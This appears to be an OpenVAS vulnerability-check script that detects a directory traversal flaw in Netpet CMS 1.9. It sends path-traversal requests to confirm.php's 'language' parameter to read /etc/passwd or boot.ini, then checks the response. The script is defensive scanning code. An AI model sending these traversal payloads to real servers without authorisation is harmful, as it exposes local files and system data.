###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_netpet_cms_dir_trav_vuln.nasl 8244 2017-12-25 07:29:28Z teissa $
#
# Netpet CMS Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have receivedreceived a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow the attackers to include
or disclose the contents of local files with the privileges of the web server.

Impact Level: Application";

tag_affected = "Netpet CMS version 1.9 and prior";

tag_insight = "The flaw is due to input validation error in the 'confirm.php'
script when processing the 'language' parameter.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running Netpet CMS and is prone to directory traversal
vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902024");
  script_version("$Revision: 8244 $");
  script_tag(name:"last_modification", value:"$Date: 2017-12-25 08:29:28 +0100 (Mon, 25 Dec 2017) $");
  script_tag(name:"creation_date", value:"2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)");
  script_cve_id("CVE-2009-4723");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Netpet CMS Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9333");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2009/2125");

  script_tag(name:"qod_type", value:"remote_banner");
  script_copyright("Copyright (c) 2010 SecPod");
  script_category(ACT_MIXED_ATTACK);
  script_family("Web application abuses");
  script_dependencies("secpod_netpet_cms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

netPort = get_http_port(default:80);
if(!netPort){
  exit(0);
}

netVer = get_kb_item("www/" + netPort + "/NetpetCMS");
if(isnull(netVer)){
 exit(0);
}

netVer = eregmatch(pattern:"^(.+) under (/.*)$", string:netVer);
if(!isnull(netVer[2]))
{
  # Attack string for Linux
  sndReq = http_get(item:string(netVer[2], "/confirm.php?language=../../" + 
                         "../../../../../etc/passwd%00"), port:netPort);
  rcvRes = http_send_recv(port:netPort, data:sndReq);
  if(":daemon:/sbin:/sbin/nologin" >< rcvRes)
  {
    security_message(netPort);
    exit(0);
  }

  # Attack string for Windows
  sndReq = http_get(item:string(netVer[2], "/confirm.php?language=../../" +
                         "../../../../../boot.ini%00"), port:netPort);
  rcvRes = http_send_recv(port:netPort, data:sndReq);
  if("\WINDOWS" >< rcvRes || "partition" >< rcvRes)
  {
    security_message(netPort);
    exit(0);
  }
}

if(!isnull(netVer[1]))
{
  # Netpet CMS Version <= 1.9
  if(version_is_less_equal(version:netVer[1], test_version:"1.9")){
    security_message(netPort);
  }
}
